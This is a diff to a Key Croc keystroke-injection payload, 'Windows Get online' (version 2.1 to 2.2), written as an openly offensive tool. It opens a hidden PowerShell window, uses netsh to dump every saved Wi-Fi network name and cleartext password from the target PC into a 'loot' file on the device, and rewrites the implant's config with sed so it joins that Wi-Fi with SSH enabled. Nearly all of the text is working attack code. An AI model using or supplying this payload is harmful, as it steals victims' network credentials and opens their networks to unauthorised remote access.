@@ -1,9 +1,9 @@
 # Title:           Windows Get online   
 # Description:     Get online automatically to target pc wifi or to your own wifi
-# Author:          spywill
-# Version:         2.1
+# Author:          spywill / RootJunky
+# Version:         2.2
 # Category:        Key Croc
-# Props:           RootJunky, Cribbit, Lodrix, potong
+# Props:           Cribbit, Lodrix, potong
 #
 #
 MATCH getonline
@@ -13,19 +13,22 @@ ATTACKMODE HID STORAGE
 sleep 5
 LED ATTACK
 Q GUI r
-sleep 0.5
-# --> Open powershell
-Q STRING "powershell -NoP -NonI -W Hidden -Exec Bypass"
-Q ENTER
 sleep 1
+# --> Open powershell
+Q STRING "powershell -NoP -NonI -W Hidden"
+Q ENTER
+sleep 2
+Q ENTER
 # --> Get KeyCroc drive
 Q STRING "\$Croc = (gwmi win32_volume -f 'label=\"KeyCroc\"' | Select-Object -ExpandProperty DriveLetter)"
 Q ENTER
-sleep 1
+sleep 2
+Q ENTER
 # --> Create wifipass.txt with the taget pc SSID and PASSWD put in Keycroc loot folder
 Q STRING "(netsh wlan show networks) | Select-String \"\:(.+)\$\" | % {\$name=\$_.Matches.Groups[1].Value.Trim(); \$_} | %{(netsh wlan show profile name=\"\$name\" key=clear)} | Select-String \"Key Content\W+\:(.+)\$\" | % {\$pass=\$_.Matches.Groups[1].Value.Trim(); \$_} | %{[PSCustomObject]@{ PROFILE_NAME=\$name;PASSWORD=\$pass }} | Out-File -Encoding UTF8 \"\$Croc\loot\wifipass.txt\""
 Q ENTER
 sleep 2
+Q ENTER
 Q STRING "exit"
 Q ENTER
 # --> Returning to HID Mode
@@ -33,8 +36,13 @@ ATTACKMODE HID
 sleep 3
 LED SETUP
 # --> Remone any existing WIFI setting & Edit config.txt with sed & Stuff the line from wifipass.txt into the hold space when processing config.txt and append and manipulate that line when needed & Remove \r end lines in config.txt file
-Q STRING "$(sed -i '/^[WS]/d' /root/udisk/config.txt && sed -i '9 a WIFI_SSID\nWIFI_PASS\nSSH ENABLE' /root/udisk/config.txt && sed -E -i '1{x;s#^#sed -n 4p root/udisk/loot/wifipass.txt#e;x};10{G;s/\n(\S+).*/ \1/};11{G;s/\n\S+//}' root/udisk/config.txt && sed -i 's/\r//g' root/udisk/config.txt)"
-Q ENTER
-sleep 3
+$(sed -i '/^[WS]/d' /root/udisk/config.txt)
+sleep 1
+$(sed -i '9 a WIFI_SSID\nWIFI_PASS\nSSH ENABLE' /root/udisk/config.txt)
+sleep 1
+$(sed -E -i '1{x;s#^#sed -n 4p root/udisk/loot/wifipass.txt#e;x};10{G;s/\n(\S+).*/ \1/};11{G;s/\n\S+//}' root/udisk/config.txt)
+sleep 1
+$(sed -i 's/\r//g' root/udisk/config.txt)
+sleep 2
 Q UNLOCK
 LED FINISH
